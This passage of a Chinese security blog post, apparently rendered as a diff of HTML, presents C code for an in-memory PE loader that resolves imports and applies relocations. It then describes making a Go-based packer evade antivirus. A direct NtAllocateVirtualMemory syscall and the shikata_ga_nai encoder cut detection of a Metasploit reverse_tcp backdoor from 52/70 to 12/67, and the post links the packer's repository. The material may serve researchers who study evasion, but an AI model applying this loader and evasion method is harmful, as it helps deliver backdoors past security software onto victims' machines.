</span><br><span class="line">	<span class="keyword">if</span> (pNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) &#123;</span><br><span class="line">		<span class="comment">// 如果是64位 </span></span><br><span class="line">		PIMAGE_NT_HEADERS64 pNtHeaders64 = (PIMAGE_NT_HEADERS64)(pNtHeaders);</span><br><span class="line">		pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)((UNPTR)pDosHeader +</span><br><span class="line">			pNtHeaders64-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (pNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) &#123;</span><br><span class="line">		<span class="comment">// 如果是32位 </span></span><br><span class="line">		pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)((UNPTR)pDosHeader +</span><br><span class="line">			pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 循环遍历DLL导入表中的DLL及获取导入表中的函数地址</span></span><br><span class="line">	<span class="keyword">char</span> *lpDllName = <span class="literal">NULL</span>;</span><br><span class="line">	HMODULE hDll = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_THUNK_DATA lpImportNameArray = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_IMPORT_BY_NAME lpImportByName = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_THUNK_DATA lpImportFuncAddrArray = <span class="literal">NULL</span>;</span><br><span class="line">	FARPROC lpFuncAddress = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="number">0</span> == pImportTable-&gt;OriginalFirstThunk)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 获取导入表中DLL的名称并加载DLL</span></span><br><span class="line">		lpDllName = (<span class="keyword">char</span> *)((UNPTR)pDosHeader + pImportTable-&gt;Name);</span><br><span class="line">		hDll = GetModuleHandleA(lpDllName);</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> == hDll)</span><br><span class="line">		&#123;</span><br><span class="line">			hDll = LoadLibraryA(lpDllName);</span><br><span class="line">			<span class="keyword">if</span> (<span class="literal">NULL</span> == hDll)</span><br><span class="line">			&#123;</span><br><span class="line">				pImportTable++;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		i = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// 获取OriginalFirstThunk以及对应的导入函数名称表首地址</span></span><br><span class="line">		lpImportNameArray = (PIMAGE_THUNK_DATA)((UNPTR)pDosHeader + pImportTable-&gt;OriginalFirstThunk);</span><br><span class="line">		<span class="comment">// 获取FirstThunk以及对应的导入函数地址表首地址</span></span><br><span class="line">		lpImportFuncAddrArray = (PIMAGE_THUNK_DATA)((UNPTR)pDosHeader + pImportTable-&gt;FirstThunk);</span><br><span class="line">		<span class="keyword">while</span> (TRUE)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="number">0</span> == lpImportNameArray[i].u1.AddressOfData)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 获取IMAGE_IMPORT_BY_NAME结构</span></span><br><span class="line">			lpImportByName = (PIMAGE_IMPORT_BY_NAME)((UNPTR)pDosHeader + lpImportNameArray[i].u1.AddressOfData);</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 判断导出函数是序号导出还是函数名称导出</span></span><br><span class="line">			<span class="keyword">if</span> (<span class="number">0x80000000</span> &amp; lpImportNameArray[i].u1.Ordinal)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">// 序号导出</span></span><br><span class="line">				<span class="comment">// 当IMAGE_THUNK_DATA值的最高位为1时，表示函数以序号方式输入，这时，低位被看做是一个函数序号</span></span><br><span class="line">				lpFuncAddress = GetProcAddress(hDll, (LPCSTR)(lpImportNameArray[i].u1.Ordinal &amp; <span class="number">0x0000FFFF</span>));</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">// 名称导出</span></span><br><span class="line">				lpFuncAddress = GetProcAddress(hDll, (LPCSTR)lpImportByName-&gt;Name);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 注意此处的函数地址表的赋值，要对照PE格式进行装载，不要理解错了！！！</span></span><br><span class="line">			lpImportFuncAddrArray[i].u1.Function = (UNPTR)lpFuncAddress;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		pImportTable++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解析重定位信息：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">DoReTable</span><span class="params">(LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* 重定位表的结构：</span></span><br><span class="line"><span class="comment">	// DWORD sectionAddress, DWORD size (包括本节需要重定位的数据)</span></span><br><span class="line"><span class="comment">	// 例如 1000节需要修正5个重定位数据的话，重定位表的数据是</span></span><br><span class="line"><span class="comment">	// 00 10 00 00   14 00 00 00      xxxx xxxx xxxx xxxx xxxx 0000</span></span><br><span class="line"><span class="comment">	// -----------   -----------      ----</span></span><br><span class="line"><span class="comment">	// 给出节的偏移  总尺寸=8+6*2     需要修正的地址           用于对齐4字节</span></span><br><span class="line"><span class="comment">	// 重定位表是若干个相连，如果address 和 size都是0 表示结束</span></span><br><span class="line"><span class="comment">	// 需要修正的地址是12位的，高4位是形态字，intel cpu下是3</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="comment">//假设NewBase是0x600000,而文件中设置的缺省ImageBase是0x400000,则修正偏移量就是0x200000</span></span><br><span class="line">	<span class="comment">//注意重定位表的位置可能和硬盘文件中的偏移地址不同，应该使用加载后的地址</span></span><br><span class="line"></span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;</span><br><span class="line">	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((UNPTR)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">	PIMAGE_BASE_RELOCATION pLoc = <span class="literal">NULL</span>;</span><br><span class="line">	ULONGLONG   ImageBase = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) &#123;</span><br><span class="line">		<span class="comment">// 如果是64位 </span></span><br><span class="line">		PIMAGE_NT_HEADERS64 pNtHeaders64 = (PIMAGE_NT_HEADERS64)(pNtHeaders);</span><br><span class="line">		pLoc = (PIMAGE_BASE_RELOCATION)((UNPTR)pDosHeader + pNtHeaders64-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);</span><br><span class="line">		ImageBase = pNtHeaders64-&gt;OptionalHeader.ImageBase;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (pNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) &#123;</span><br><span class="line">		<span class="comment">// 如果是32位 </span></span><br><span class="line">		pLoc = (PIMAGE_BASE_RELOCATION)((UNPTR)pDosHeader + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);</span><br><span class="line">		ImageBase = pNtHeaders-&gt;OptionalHeader.ImageBase;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 判断是否有 重定位表</span></span><br><span class="line">	<span class="keyword">if</span> ((PVOID)pLoc == (PVOID)pDosHeader)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 重定位表 为空</span></span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> ((pLoc-&gt;VirtualAddress + pLoc-&gt;SizeOfBlock) != <span class="number">0</span>) <span class="comment">//开始扫描重定位表</span></span><br><span class="line">	&#123;</span><br><span class="line">		WORD *pLocData = (WORD *)((PBYTE)pLoc + <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line">		<span class="comment">//计算本节需要修正的重定位项（地址）的数目</span></span><br><span class="line">		<span class="keyword">int</span> nNumberOfReloc = (pLoc-&gt;SizeOfBlock - <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="keyword">sizeof</span>(WORD);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nNumberOfReloc; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// 每个WORD由两部分组成。高4位指出了重定位的类型，WINNT.H中的一系列IMAGE_REL_BASED_xxx定义了重定位类型的取值。</span></span><br><span class="line">			<span class="comment">// 低12位是相对于VirtualAddress域的偏移，指出了必须进行重定位的位置。</span></span><br><span class="line"></span><br><span class="line">			<span class="meta">#<span class="meta-keyword">ifdef</span> _WIN64</span></span><br><span class="line">			<span class="keyword">if</span> ((DWORD)(pLocData[i] &amp; <span class="number">0x0000F000</span>) == <span class="number">0x0000A000</span>)</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="comment">// 64位dll重定位，IMAGE_REL_BASED_DIR64</span></span><br><span class="line">			<span class="comment">// 对于IA-64的可执行文件，重定位似乎总是IMAGE_REL_BASED_DIR64类型的。</span></span><br><span class="line"></span><br><span class="line">				UNPTR* pAddress = (UNPTR *)((PBYTE)pDosHeader + pLoc-&gt;VirtualAddress + (pLocData[i] &amp; <span class="number">0x0FFF</span>));</span><br><span class="line">				UNPTR ullDelta = (UNPTR)pDosHeader - ImageBase;</span><br><span class="line">			    *pAddress += ullDelta;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">            <span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">			<span class="keyword">if</span> ((DWORD)(pLocData[i] &amp; <span class="number">0x0000F000</span>) == <span class="number">0x00003000</span>) <span class="comment">//这是一个需要修正的地址</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">// 32位dll重定位，IMAGE_REL_BASED_HIGHLOW</span></span><br><span class="line">				<span class="comment">// 对于x86的可执行文件，所有的基址重定位都是IMAGE_REL_BASED_HIGHLOW类型的。</span></span><br><span class="line">				UNPTR* pAddress = (UNPTR*)((PBYTE)pDosHeader + pLoc-&gt;VirtualAddress + (pLocData[i] &amp; <span class="number">0x0FFF</span>));</span><br><span class="line">				UNPTR dwDelta = (UNPTR)pDosHeader - ImageBase;</span><br><span class="line">				*pAddress += dwDelta;</span><br><span class="line"></span><br><span class="line">		    &#125;</span><br><span class="line">            <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//转移到下一个节进行处理</span></span><br><span class="line">		pLoc = (PIMAGE_BASE_RELOCATION)((PBYTE)pLoc + pLoc-&gt;SizeOfBlock);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于函数 <code>VirtualAlloc</code> 是杀毒软件关注的重点函数，所以直接使用这个函数会被大多数的杀软杀掉，本文在VT上测试的时候是<code>18/69</code>,而且直接被火绒干掉，效果非常不理想:<br><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-00-58-55.png" alt=""></p>
+<p>后来我利用项目 <a href="https://github.com/mai1zhi2/SysWhispers2_x86/tree/main/SysWhispers2_x86_WOW64Gate" target="_blank" rel="noopener">https://github.com/mai1zhi2/SysWhispers2_x86/tree/main/SysWhispers2_x86_WOW64Gate</a>中函数 <code>NtAllocateVirtualMemory</code> 的direct syscall 汇编代码来代替函数调用，然后获得了比较好的免杀效果。</p>
+<p>同样使用 <code>msf</code> 生成的reverse_tcp后门进行测试：<br>免杀前的是 <code>52/70</code></p>
+<p><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-01-04-57.png" alt=""></p>
+<p>免杀后是 <code>12/67</code>:</p>
+<p><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-01-06-11.png" alt=""></p>
+<p>有几款杀软报毒<code>Exploit.Shellcode</code>是因为他们有沙箱，而且可以看到样本的外联行为。剩下的几款杀毒引擎一看见go语言的二进制就报毒，因为我测试go语言写的<code>hello world</code> 他们也会报毒，所以没有参考价值。<br><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-01-14-47.png" alt=""></p>
+<p>虚拟执行能力比较强的火绒也无法检出。</p>
+<p><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-01-20-12.png" alt=""></p>
+<p>添加一个编码器 <code>x86/shikata_ga_nai</code> 之后的效果看起来真的不错。<br><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-08-08-42.png" alt=""></p>
+<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>代码比较简单,放在了github上 <a href="https://github.com/wonderkun/go-packer" target="_blank" rel="noopener">https://github.com/wonderkun/go-packer</a>，<br>需要说明一下的是,由于<code>SysWhispers2_x86_WOW64Gate</code>中有代码是使用汇编实现的，为了能使用<code>MingGw</code>进行链接，所以必须使用<code>uasm</code>进行编译(不能使用vs的masm进行编译，否则无法完成静态链接)。<br>但是mac平台安装<code>uasm</code>比较麻烦，所以只能在windows平台上进行编译。所以本代码中放的直接就是编译好的32位的静态链接库，仅支持生成32位二进制文件，如果想生成64位的二进制文件，请自行编译静态态链接库，并修改makefile。</p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul>
+<li><p><a href="https://www.proofpoint.com/us/blog/threat-insight/ta416-goes-ground-and-returns-golang-plugx-malware-loader" target="_blank" rel="noopener">https://www.proofpoint.com/us/blog/threat-insight/ta416-goes-ground-and-returns-golang-plugx-malware-loader</a></p>
+</li>
+<li><p><a href="https://github.com/guitmz/ezuri" target="_blank" rel="noopener">https://github.com/guitmz/ezuri</a></p>
+</li>
+<li><p><a href="https://www.guitmz.com/running-elf-from-memory/" target="_blank" rel="noopener">https://www.guitmz.com/running-elf-from-memory/</a></p>
+</li>
+<li><p><a href="https://sysopfb.github.io/malware/2020/02/28/Golang-Wrapper-on-an-old-malware.html" target="_blank" rel="noopener">https://sysopfb.github.io/malware/2020/02/28/Golang-Wrapper-on-an-old-malware.html</a></p>
+</li>
+<li><p><a href="https://github.com/mai1zhi2/SysWhispers2_x86" target="_blank" rel="noopener">https://github.com/mai1zhi2/SysWhispers2_x86</a></p>
+</li>
+</ul>
+
+        <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-9381923643450020"
+     data-ad-slot="2524986173"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+        <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- 页面嵌入广告 -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-9381923643450020"
+     data-ad-slot="3413388404"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88/" rel="tag"># 杀软的无奈</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/12/13/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88-%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%AF%87(%E4%B8%80)/" rel="prev" title="杀软的无奈-基础工具篇(一)">
+      <i class="fa fa-chevron-left"></i> 杀软的无奈-基础工具篇(一)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/04/25/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88-metasploit%E7%9A%84shellcode%E5%88%86%E6%9E%90(%E4%B8%89)/" rel="next" title="杀软的无奈-metasploit的shellcode loader分析(三)">
+      杀软的无奈-metasploit的shellcode loader分析(三) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#背景知识"><span class="nav-number">2.</span> <span class="nav-text">背景知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开始正题"><span class="nav-number">3.</span> <span class="nav-text">开始正题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#linux平台免杀"><span class="nav-number">4.</span> <span class="nav-text">linux平台免杀</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#windows平台免杀"><span class="nav-number">5.</span> <span class="nav-text">windows平台免杀</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#代码实现"><span class="nav-number">6.</span> <span class="nav-text">代码实现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reference"><span class="nav-number">7.</span> <span class="nav-text">reference</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wonderkun"
+      src="https://pic.wonderkun.cc/uploads/2016/04/09451H922-11.jpg">
+  <p class="site-author-name" itemprop="name">wonderkun</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">58</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">46</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/wonderkun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;wonderkun" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/729173164@qq.com" title="E-Mail → 729173164@qq.com"><i class="QQ fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.leavesongs.com/" title="https:&#x2F;&#x2F;www.leavesongs.com&#x2F;" rel="noopener" target="_blank">phithon</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.bertramc.cn/" title="https:&#x2F;&#x2F;www.bertramc.cn&#x2F;" rel="noopener" target="_blank">berTrAM</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.cnblogs.com/" title="http:&#x2F;&#x2F;www.cnblogs.com&#x2F;" rel="noopener" target="_blank">l3m0n</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.yulegeyu.com/" title="http:&#x2F;&#x2F;www.yulegeyu.com&#x2F;" rel="noopener" target="_blank">雨神</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.wupco.cn/" title="http:&#x2F;&#x2F;www.wupco.cn&#x2F;" rel="noopener" target="_blank">wupco</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.bendawang.site/" title="http:&#x2F;&#x2F;www.bendawang.site&#x2F;" rel="noopener" target="_blank">bendawang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://pcat.cnblogs.com/" title="http:&#x2F;&#x2F;pcat.cnblogs.com&#x2F;" rel="noopener" target="_blank">pcat</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.yqxiaojunjie.com/" title="http:&#x2F;&#x2F;www.yqxiaojunjie.com&#x2F;" rel="noopener" target="_blank">乐清小俊杰</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://lorexxar.cn/" title="https:&#x2F;&#x2F;lorexxar.cn&#x2F;" rel="noopener" target="_blank">LoRexxar</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://pupiles.com/" title="http:&#x2F;&#x2F;pupiles.com&#x2F;" rel="noopener" target="_blank">Pupil</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.venenof.com/" title="http:&#x2F;&#x2F;www.venenof.com&#x2F;" rel="noopener" target="_blank">venenof</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.bywalks.com/" title="http:&#x2F;&#x2F;www.bywalks.com&#x2F;" rel="noopener" target="_blank">bywalks</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://chybeta.github.io/" title="https:&#x2F;&#x2F;chybeta.github.io&#x2F;" rel="noopener" target="_blank">chybeta</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://blog.evalbug.com/" title="http:&#x2F;&#x2F;blog.evalbug.com&#x2F;" rel="noopener" target="_blank">yan表哥</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://pav1.cc/wordpress/" title="http:&#x2F;&#x2F;pav1.cc&#x2F;wordpress&#x2F;" rel="noopener" target="_blank">Pav1师傅</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.venenof.com/" title="http:&#x2F;&#x2F;www.venenof.com&#x2F;" rel="noopener" target="_blank">venenof7</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.smi1e.top/" title="https:&#x2F;&#x2F;www.smi1e.top&#x2F;" rel="noopener" target="_blank">smi1e</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://afang5472.blogspot.com/" title="https:&#x2F;&#x2F;afang5472.blogspot.com&#x2F;" rel="noopener" target="_blank">afang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://rebirthwyw.com/" title="https:&#x2F;&#x2F;rebirthwyw.com&#x2F;" rel="noopener" target="_blank">rebirthwyw</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://ww9210.cn/" title="https:&#x2F;&#x2F;ww9210.cn&#x2F;" rel="noopener" target="_blank">ww9210</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://magicbluech.github.io/" title="https:&#x2F;&#x2F;magicbluech.github.io&#x2F;" rel="noopener" target="_blank">magicbluech</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://d1nn3r.github.io/" title="https:&#x2F;&#x2F;d1nn3r.github.io&#x2F;" rel="noopener" target="_blank">d1nn3r</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.rai4over.cn/" title="http:&#x2F;&#x2F;www.rai4over.cn&#x2F;" rel="noopener" target="_blank">rai4over</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">陕ICP备17014925号 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wonderkun</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/fancybox/jquery.min.js"></script>
+  <script src="/lib/fancybox/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : true,
+      notify     : true,
+      appId      : 'T7sfFTnT9P1YS302SrmgIa3m-gzGzoHsz',
+      appKey     : 'WfIozMe5BYlmjQ5VMPJpu4G2',
+      placeholder: "ヾﾉ≧∀≦)o来啊，尽情吐槽啊!",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
